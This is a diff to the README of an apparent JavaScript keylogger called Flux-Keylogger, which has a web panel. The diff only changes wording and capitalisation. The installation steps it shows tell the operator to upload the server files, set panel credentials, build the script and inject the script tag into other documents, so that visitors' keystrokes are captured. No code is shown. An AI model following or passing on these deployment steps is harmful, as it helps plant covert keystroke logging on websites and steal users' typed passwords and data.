@@ -1,5 +1,5 @@
 # :zap: Flux-Keylogger
-> Simple javascript keylogger with web panel
+> Modern javascript keylogger with web panel
 
 <p align="center">
   <img src="images/logo.png">
@@ -21,8 +21,8 @@ ___
 * User-Agents
 
 ## :satellite: Installation server files:
-* upload files from `server` directory to you server
-* change default username, password in flux.php
-* go to http://you.host/flux.php
-* click build
+* Upload files from `server` directory to you server
+* Change default username, password in flux.php
+* Go to http://you.host/flux.php
+* Click build
 * Now inject script tag to other documents
